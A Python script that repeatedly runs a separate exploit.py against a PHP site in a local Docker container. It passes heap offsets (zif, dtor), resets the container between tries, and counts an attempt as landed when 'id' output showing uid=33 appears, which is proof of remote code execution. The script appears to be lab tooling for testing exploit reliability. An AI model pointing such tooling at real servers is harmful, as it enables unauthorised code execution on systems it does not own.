import os
import subprocess, sys, time
BASE = os.path.dirname(os.path.abspath(__file__))
# container, port, zif, dtor, attempts
c      = sys.argv[1]
port   = sys.argv[2]
zif    = sys.argv[3]
dtor   = sys.argv[4]
N      = int(sys.argv[5]) if len(sys.argv) > 5 else 5

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def clean():
    # wipe dirty state that scrambles the heap layout
    sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 /var/www/html/chk.php /tmp/* 2>/dev/null"')
    sh(f'docker restart {c}')
    time.sleep(3.0)

def attempt():
    clean()
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--retries", "2",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    return out

landed = False
for i in range(1, N + 1):
    out = attempt()
    ok = "uid=33" in out
    reached = "stage1"
    if "stage 2" in out: reached = "stage2"
    if "stage 3" in out: reached = "stage3"
    print(f"[{c}] attempt {i}: {'PROOF' if ok else 'no'} (reached {reached})", flush=True)
    if ok:
        proof = sh(f'docker exec {c} cat /www/p1').stdout.strip()
        print(f"    proof: {proof[:60]}", flush=True)
        landed = True
        break
print(f"=== {c}: {'LANDED' if landed else 'NOT LANDED'} in {N} attempts ===", flush=True)
